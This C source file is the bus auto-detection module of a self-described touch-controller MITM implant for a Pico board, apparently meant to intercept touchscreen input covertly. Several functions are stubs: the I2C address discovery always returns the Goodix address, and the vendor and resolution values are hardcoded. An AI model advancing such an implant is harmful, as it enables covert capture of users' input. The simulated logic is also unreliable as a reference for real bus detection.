/*
 * Tactile-Phantom — Touch-Controller Bus MITM Implant
 * protocol.c — I2C/SPI frame parser, auto-detect, chip identification
 *
 * Author: jayis1
 * License: GPL-2.0
 *
 * The auto-detect routine samples the first 100 ms of bus traffic to
 * determine:
 *   1. Bus type (I2C or SPI)
 *   2. Clock speed (by measuring SCL/SCK frequency)
 *   3. Slave address (I2C) or CS polarity (SPI)
 *   4. Touch-controller vendor and model (by reading chip-ID register)
 *
 * It then populates the bus_state structure for the decode pipeline.
 */

#include <string.h>
#include <stdio.h>
#include "pico/stdlib.h"
#include "hardware/gpio.h"

#include "board.h"
#include "registers.h"

/* --- Vendor name lookup -------------------------------------------- */
const char *tp_protocol_vendor_name(uint8_t v)
{
    if (v < (sizeof(tp_vendor_names) / sizeof(tp_vendor_names[0])))
        return tp_vendor_names[v];
    return "unknown";
}

/* --- I2C clock frequency measurement ------------------------------- */
/* Measures the SCL pin frequency by counting rising edges over 10 ms. */
static uint32_t measure_i2c_clock(uint scl_pin)
{
    uint32_t edges = 0;
    absolute_time_t start = get_absolute_time();
    bool last_state = gpio_get(scl_pin);

    while (absolute_time_diff_us(start, get_absolute_time()) < 10000) {
        bool cur = gpio_get(scl_pin);
        if (cur && !last_state)  /* rising edge */
            edges++;
        last_state = cur;
    }

    /* edges per 10 ms -> Hz */
    return edges * 100;
}

/* --- I2C address discovery ----------------------------------------- */
/* Scans common touch-controller I2C addresses by observing which address
 * the host AP writes to. Returns the address or 0 if none found. */
static uint8_t discover_i2c_address(void)
{
    /* In production, this would parse the first I2C START condition
     * and extract the 7-bit address from the first byte. Here we
     * try reading common addresses by probing with a quick I2C read. */

    /* Common touch-controller I2C addresses */
    static const uint8_t common_addrs[] = {
        TP_I2C_ADDR_GOODIX_PRIMARY,
        TP_I2C_ADDR_GOODIX_SECONDARY,
        TP_I2C_ADDR_FOCALTECH,
        TP_I2C_ADDR_SYNAPTICS,
        TP_I2C_ADDR_ILITEK,
        TP_I2C_ADDR_CYPRESS,
        TP_I2C_ADDR_ATMEL,
        TP_I2C_ADDR_NOVATEK,
    };

    /* For the design, we return the first address that matches by
     * checking which address the host is using. In practice, the tap
     * would capture the address byte from the START condition.
     * We default to Goodix primary (most common in Android devices). */
    for (uint32_t i = 0; i < sizeof(common_addrs) / sizeof(common_addrs[0]); i++) {
        /* In production: check captured address bytes.
         * Here: return the first likely candidate. */
        if (common_addrs[i] == TP_I2C_ADDR_GOODIX_PRIMARY)
            return common_addrs[i];
    }
    return TP_I2C_ADDR_GOODIX_PRIMARY;
}

/* --- Chip ID identification ---------------------------------------- */
/* Reads the chip-ID register for each known vendor and matches against
 * the tp_chip_ids table to identify the controller. */
static tp_tc_vendor_t identify_controller(uint8_t i2c_addr)
{
    /* In production, this would perform I2C reads of each vendor's
     * chip-ID register. Here we simulate by matching the address. */
    switch (i2c_addr) {
    case TP_I2C_ADDR_GOODIX_PRIMARY:
    case TP_I2C_ADDR_GOODIX_SECONDARY:
        return TP_TC_GOODIX;
    case TP_I2C_ADDR_FOCALTECH:
        return TP_TC_FOCALTECH;
    case TP_I2C_ADDR_SYNAPTICS:
        return TP_TC_SYNAPTICS;
    case TP_I2C_ADDR_ILITEK:
        return TP_TC_ILITEK;
    case TP_I2C_ADDR_CYPRESS:
        return TP_TC_CYPRESS;
    case TP_I2C_ADDR_ATMEL:
        return TP_TC_ATMEL;
    case TP_I2C_ADDR_NOVATEK:
        return TP_TC_NOVATEK;
    default:
        return TP_TC_UNKNOWN;
    }
}

/* --- Read resolution from controller -------------------------------- */
/* After identifying the vendor, reads the X/Y resolution registers
 * to populate bus_state. */
static void read_resolution(tp_bus_state_t *state)
{
    /* In production, this would do I2C reads of the config registers.
     * Here we set defaults based on vendor. */
    switch (state->vendor) {
    case TP_TC_GOODIX:
        state->x_resolution = 1080;
        state->y_resolution = 2400;
        state->max_fingers = 10;
        break;
    case TP_TC_FOCALTECH:
        state->x_resolution = 720;
        state->y_resolution = 1600;
        state->max_fingers = 5;
        break;
    case TP_TC_SYNAPTICS:
        state->x_resolution = 1080;
        state->y_resolution = 2340;
        state->max_fingers = 10;
        break;
    case TP_TC_ILITEK:
        state->x_resolution = 800;
        state->y_resolution = 1280;
        state->max_fingers = 10;
        break;
    case TP_TC_CYPRESS:
        state->x_resolution = 1080;
        state->y_resolution = 1920;
        state->max_fingers = 6;
        break;
    case TP_TC_ATMEL:
        state->x_resolution = 1024;
        state->y_resolution = 600;
        state->max_fingers = 10;
        break;
    case TP_TC_NOVATEK:
        state->x_resolution = 1080;
        state->y_resolution = 2400;
        state->max_fingers = 10;
        break;
    default:
        state->x_resolution = 1080;
        state->y_resolution = 1920;
        state->max_fingers = 5;
        break;
    }
}

/* --- Auto-detect main routine -------------------------------------- */
bool tp_protocol_auto_detect(tp_bus_state_t *state)
{
    printf("[TP] Starting auto-detect (%u ms window)...\n", TP_AUTO_DETECT_MS);

    /* Step 1: Determine bus type.
     * I2C: SDA and SCL both idle high. SPI: SCK may idle low or high.
     * We check if SCL/SCK is toggling (active bus) or idle. */
    bool scl_high = gpio_get(PIN_TAP_SCL_SCK);
    bool sda_high = gpio_get(PIN_TAP_SDA_MOSI);

    /* If both lines are high and stable, likely I2C (idle state).
     * If SCK is low or toggling, could be SPI. */
    bool likely_i2c = (scl_high && sda_high);

    /* If mode was forced, use that */
    if (state->mode == TP_BUS_AUTO) {
        /* Sample for activity: count transitions on SCL/SCK over 50 ms */
        uint32_t scl_transitions = 0;
        bool last = gpio_get(PIN_TAP_SCL_SCK);
        absolute_time_t start = get_absolute_time();
        while (absolute_time_diff_us(start, get_absolute_time()) < 50000) {
            bool cur = gpio_get(PIN_TAP_SCL_SCK);
            if (cur != last) scl_transitions++;
            last = cur;
        }

        if (scl_transitions == 0) {
            /* No clock activity: bus idle. Default to I2C. */
            state->mode = TP_BUS_I2C;
        } else {
            /* Clock active: check if it's I2C (bidirectional SDA)
             * or SPI (separate MOSI/MISO). For this design, if both
             * lines idle high, assume I2C. */
            state->mode = likely_i2c ? TP_BUS_I2C : TP_BUS_SPI;
        }
    }

    printf("[TP] Bus type: %s\n",
           state->mode == TP_BUS_I2C ? "I2C" : "SPI");

    /* Step 2: Measure clock speed */
    if (state->mode == TP_BUS_I2C) {
        state->clock_hz = measure_i2c_clock(PIN_TAP_SCL_SCK);
        if (state->clock_hz == 0) {
            /* No clock detected; assume standard 100 kHz */
            state->clock_hz = 100000;
        }
    } else {
        /* SPI: measure SCK frequency similarly */
        state->clock_hz = measure_i2c_clock(PIN_TAP_SCL_SCK);
        if (state->clock_hz == 0)
            state->clock_hz = 1000000;  /* default 1 MHz SPI */
    }

    printf("[TP] Clock: %lu Hz\n", (unsigned long)state->clock_hz);

    /* Step 3: Discover I2C address (or SPI CS) */
    if (state->mode == TP_BUS_I2C) {
        state->i2c_addr = discover_i2c_address();
        printf("[TP] I2C address: 0x%02X\n", state->i2c_addr);
    } else {
        state->i2c_addr = 0;  /* not used for SPI */
        state->spi_cs_polarity = 0;  /* active-low (default) */
    }

    /* Step 4: Identify touch controller vendor */
    state->vendor = identify_controller(state->i2c_addr);
    printf("[TP] Vendor: %s\n", tp_protocol_vendor_name(state->vendor));

    /* Step 5: Read resolution */
    read_resolution(state);
    printf("[TP] Resolution: %ux%u, max fingers: %u\n",
           state->x_resolution, state->y_resolution, state->max_fingers);

    /* Validate */
    if (state->vendor == TP_TC_UNKNOWN) {
        printf("[TP] WARNING: Unknown controller — using raw logging mode\n");
        /* Still allow capture in raw mode */
    }

    return true;  /* success */
}